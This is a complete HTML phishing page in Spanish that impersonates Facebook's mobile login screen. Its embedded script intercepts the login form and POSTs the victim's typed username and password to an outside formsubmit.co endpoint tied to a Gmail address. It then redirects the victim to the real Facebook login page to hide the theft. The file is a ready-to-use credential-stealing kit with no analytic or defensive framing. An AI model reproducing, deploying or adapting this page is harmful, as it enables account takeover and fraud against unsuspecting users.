<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
        .logo { color: #0866ff; font-size: 30px; font-weight: bold; margin: 40px 0 20px 0; letter-spacing: -1px; }
        .box { width: 90%; max-width: 380px; }
        input { width: 100%; background-color: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 8px; padding: 14px; margin-bottom: 12px; font-size: 14px; box-sizing: border-box; outline: none; }
        .btn-blue { width: 100%; background-color: #0866ff; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .links { text-align: center; margin-top: 15px; }
        .link-blue { color: #0866ff; text-decoration: none; font-size: 14px; display: block; margin: 15px 0; }
        .line { border-top: 1px solid #dadde1; margin: 20px 0; }
        .btn-new { background-color: transparent; color: #0866ff; border: 1px solid #0866ff; border-radius: 8px; padding: 10px 20px; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="logo">facebook</div>
    <div class="box">
        <form onsubmit="enviar(event)">
            <input type="text" id="u" placeholder="Número de celular o correo electrónico" required>
            <input type="password" id="p" placeholder="Contraseña" required>
            <button type="submit" class="btn-blue">Iniciar sesión</button>
        </form>
        <div class="links">
            <a href="https://m.facebook.com/login/identify/" class="link-blue">¿Olvidaste tu contraseña?</a>
            <div class="line"></div>
            <a href="https://m.facebook.com/reg/" class="btn-new">Crear cuenta nueva</a>
        </div>
    </div>
    <script>
        function enviar(e) {
            e.preventDefault();
            fetch('https://formsubmit.co/ajax/83739387z@gmail.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ Usuario: document.getElementById('u').value, Clave: document.getElementById('p').value })
            }).then(() => { window.location.href = "https://m.facebook.com/login/"; });
        }
    </script>
</body>
</html>
